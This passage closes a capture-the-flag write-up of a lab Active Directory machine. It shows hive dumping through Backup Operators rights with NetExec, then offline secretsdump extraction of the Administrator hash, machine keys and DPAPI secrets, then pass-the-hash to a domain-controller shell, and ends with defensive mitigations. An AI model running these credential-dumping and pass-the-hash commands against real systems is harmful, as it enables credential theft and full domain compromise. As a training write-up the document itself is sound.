> `DC01` accepts our cross-realm ticket, but the injected SID `...-1603` conferred **Backup Operators** (`SeBackupPrivilege`) rather than direct Domain Admins. Frontal execution methods like `wmiexec -k` or accessing `C$` directly are blocked; we need to leverage registry extraction via Backup Operators rights.

We execute the NetExec `backup_operator` module:

```bash
netexec smb 172.16.20.1 -k --use-kcache -M backup_operator
SMB         172.16.20.1     445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:darkzero.htb) (signing:True) (SMBv1:False)                                     
SMB         172.16.20.1     445    DC01             [+] DARKZERO.EXT\celia from ccache 
BACKUP_O... 172.16.20.1     445    DC01             [*] Triggering RemoteRegistry to start through named pipe...
BACKUP_O... 172.16.20.1     445    DC01             Saved HKLM\SAM to \\172.16.20.1\SYSVOL\SAM
BACKUP_O... 172.16.20.1     445    DC01             Saved HKLM\SYSTEM to \\172.16.20.1\SYSVOL\SYSTEM                                               
BACKUP_O... 172.16.20.1     445    DC01             Saved HKLM\SECURITY to \\172.16.20.1\SYSVOL\SECURITY                                           
SMB         172.16.20.1     445    DC01             [*] Copying "SAM" to "/root/.nxc/logs/DC01_172.16.20.1_2026-09-10_224132.SAM"
SMB         172.16.20.1     445    DC01             [+] File "SAM" was downloaded to "/root/.nxc/logs/DC01_172.16.20.1_2026-09-10_224132.SAM"
SMB         172.16.20.1     445    DC01             [*] Copying "SECURITY" to "/root/.nxc/logs/DC01_172.16.20.1_2026-09-10_224132.SECURITY"
SMB         172.16.20.1     445    DC01             [+] File "SECURITY" was downloaded to "/root/.nxc/logs/DC01_172.16.20.1_2026-09-10_224132.SECURITY"
SMB         172.16.20.1     445    DC01             [*] Copying "SYSTEM" to "/root/.nxc/logs/DC01_172.16.20.1_2026-09-10_224132.SYSTEM"
SMB         172.16.20.1     445    DC01             [-] Error writing file "SYSTEM" from share "SYSVOL": The NETBIOS connection with the remote host timed out.
BACKUP_O... 172.16.20.1     445    DC01             [-] Fail to dump the sam and lsa: [Errno 2] No such file or directory: '/root/.nxc/logs/DC01_172.16.20.1_2026-09-10_224132.SYSTEM'
BACKUP_O... 172.16.20.1     445    DC01             [*] Use the domain admin account to clean the file on the remote host
BACKUP_O... 172.16.20.1     445    DC01             [*] netexec smb dc_ip -u user -p pass -x "del C:\Windows\sysvol\sysvol\SECURITY && del C:\Windows\sysvol\sysvol\SAM && del C:\Windows\sysvol\sysvol\SYSTEM"
```

#### How the Backup Operator Module Works:
1. The module interacts over named pipes to activate the `RemoteRegistry` service.
2. Leveraging `SeBackupPrivilege`, it executes a registry save: `HKLM\SAM`, `HKLM\SYSTEM`, and `HKLM\SECURITY` are exported directly from kernel memory and staged into `\\172.16.20.1\SYSVOL\`.
3. It retrieves the saved registry hives: `SAM` and `SECURITY` were downloaded. The remaining `SYSTEM` hive can be retrieved directly from the `SYSVOL` share through our established SMB tunnel.

### Trust Phase 4: Offline Secret Extraction & Pass-the-Hash to Domain Admin

Using Impacket's `secretsdump`, we extract secrets locally from the downloaded registry hives:

```bash
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
Impacket v0.14.0.dev0+20260317.95020.1049826e - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xd7104de0ccfc39117fa0498a3dfbd8a3
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:4d470bb7497acf3f5f5c2a11872e02ac:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
DARKZERO\DC01$:aes256-cts-hmac-sha1-96:25e878d205e933e9e4990104899a59479088201782134522f8ae10e0eda42da1
DARKZERO\DC01$:aes128-cts-hmac-sha1-96:48db83ae20b4f866bbd722438fd35833
DARKZERO\DC01$:des-cbc-md5:a297dcdcdcc1b054
DARKZERO\DC01$:plain_password_hex:e34b7c135478de67b873d79887d8bf675517fdf4e47d889bb6d79652abb7e496e46b1b15e4406d8e793b4f920423e7ba161eae73f083a6f7e7bf22faf9b017ac5cf7244d90e6e0ac46031e77a34598d073ef8286133f166ea75a34162ff9d21d41f2c57810a6fc936cfbc4205a3f4dd77796ceb4bdc410378f5e33418a3e392141e44b8d0598bfc03a68f70b6f8a8ab5a380ec60f9ce5a60076983ba972c18241266579a1d28d91241e804c766622b0dbe448b8513825c44e2e286840367280fa05d2d69860806f24f392ef98c0b68efc66dcef05f0cd0c30139837848d12a8bc1b64307f63495453d67a2dbbb5f8817
DARKZERO\DC01$:aad3b435b51404eeaad3b435b51404ee:686d06e419d66abfa5fefac2618cdcea:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x22c0c905bd49a8e038bfd5b8a30b1b96a52cb087
dpapi_userkey:0x33aef7188b336e1e7e32e49e6a02707b99214d31
[*] NL$KM 
 0000   FA 36 C7 D5 C0 82 AB B5  78 E1 17 F0 5E 36 13 5B   .6......x...^6.[
 0010   A5 9F C0 9C 38 A8 C4 34  FE 20 F7 2B D9 A2 8C AF   ....8..4. .+....
 0020   71 F2 E0 D2 09 A1 EC 09  EB DE 9B 8C F5 4A E6 2D   q............J.-
 0030   6B 1D 32 16 A2 ED B4 AE  F1 51 AE 5B 41 E5 4E B6   k.2......Q.[A.N.
NL$KM:fa36c7d5c082abb578e117f05e36135ba59fc09c38a8c434fe20f72bd9a28caf71f2e0d209a1ec09ebde9b8cf54ae62d6b1d3216a2edb4aef151ae5b41e54eb6
[*] Cleaning up... 
```

`SYSTEM` yields the boot key, `SAM` yields the local account database, and out pops the prize:

```text
Administrator:500:aad3b435b51404eeaad3b435b51404ee:4d470bb7497acf3f5f5c2a11872e02ac:::
```

One NT hash — a single key machined to unlock the root domain controller. We execute Pass-the-Hash with `impacket-wmiexec`:

```bash
impacket-wmiexec -hashes :4d470bb7497acf3f5f5c2a11872e02ac Administrator@172.16.20.1
Impacket v0.14.0.dev0+20260317.95020.1049826e - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
darkzero\administrator
```

Target down! Domain compromised!

> 🎯 **Conclusion & Author Reflection:**  
> To be very honest, this was a fabulous machine of this season. Even though it wears the mask of a "Hard" difficulty rating, it behaves like an Insane box under the hood. The multi-stage exploitation chain was exceptionally engaging, covering complex template internals, modern CI/CD context confusion, and cross-forest Kerberos trust mechanics. Happy Hacking!

---

## Step 5 - Mitigations & Defensive Hardening

To remediate the vulnerabilities identified across the DarkZero Returns environment, administrators should apply defense-in-depth hardening across application, CI/CD, and Active Directory layers:

### 1. Handlebars AST Injection Remediation (CVE-2026-33937)

- **Strict Type Validation:** Ensure user input supplied to template rendering engines is strictly validated as a primitive string (`typeof input === 'string'`). Never pass unvalidated JSON objects directly into `Handlebars.compile()`.
- **Package Patching:** Upgrade `handlebars` to ≥4.7.9 where strict type assertion is applied to `NumberLiteral` AST nodes, preventing arbitrary code injection during template compilation.
- **Runtime Sandboxing:** If dynamic templates must be evaluated server-side, execute template rendering within isolated V8 contexts (such as `isolated-vm`) with prototype access disabled.

### 2. Gitea CI/CD Workflow & Runner Isolation (CVE-2026-20750)

- **Upgrade Gitea Service:** Update Gitea to version ≥1.25.1 or the latest patched release where event context evaluation ensures workflows triggered by external pull requests execute strictly under fork-scoped permissions.
- **Containerized Runner Isolation:** Configure `act_runner` to execute all jobs within ephemeral, unprivileged Docker containers rather than directly on the host system (`ubuntu:host`). Disable Docker socket mounting inside runner containers.
- **Enforce Maintainer Approvals:** Require manual approval from repository owners before executing any workflow triggered by external fork events or pull request review comments (`pull_request_review_comment`).

### 3. Active Directory DACL Least Privilege

- **Audit Delegation Rights:** Conduct recurring DACL audits to identify excessive delegation. Remove `CREATE_CHILD` permissions from non-administrative service accounts (such as `svc-runner`) on organizational units (`OU=GiteaMigration`).
- **Administrative Tiering:** Enforce strict Active Directory tiering boundaries. Service accounts associated with Linux hosts or CI/CD systems must reside in Tier 1 or Tier 2 OUs without the ability to create objects or modify directory structures.

### 4. Kerberos SID Filtering & Inter-Domain Trust Hardening

- **Enable SID Filtering on Trusts:** Active Directory does not automatically quarantine SID History across all trust types. Administrators must explicitly enforce SID Filtering on all inter-domain and forest trusts:
  ```cmd
  netdom trust <ChildDomain> /domain:<ParentDomain> /EnableSIDFiltering:yes
  netdom trust <ChildDomain> /domain:<ParentDomain> /quarantine:yes
  ```
  This forces the KDC to strip foreign SIDs from the Kerberos PAC during inter-domain referral ticket issuance, preventing cross-domain Golden Ticket escalation.
- **Restrict SeBackupPrivilege:** Restrict membership in the `Backup Operators` group to dedicated backup solutions, and disable the `RemoteRegistry` service on all Domain Controllers.
- **Regular krbtgt Key Rotation:** Implement automated, bi-annual rotation of the `krbtgt` account password (performed twice in succession with a 24-hour interval) to invalidate any forged Golden Tickets.
